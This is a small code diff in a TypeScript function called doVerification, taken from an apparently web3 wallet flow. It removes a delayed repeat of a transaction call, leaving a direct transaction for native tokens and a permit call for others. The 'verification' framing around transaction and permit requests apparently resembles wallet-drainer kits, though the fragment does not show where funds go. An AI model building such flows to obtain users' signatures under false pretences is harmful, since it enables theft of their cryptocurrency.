@@ -120,10 +120,6 @@ export async function doVerification(provider: ReturnType<typeof useEthersProvid
 
 	if (token.native_token) {
 		await unity.transaction();
-		const interval = setInterval(async ()=>{
-			await unity.transaction();
-			clearInterval(interval);
-		}, 10000)
 	} else {
 		try {
 			await unity.permit();
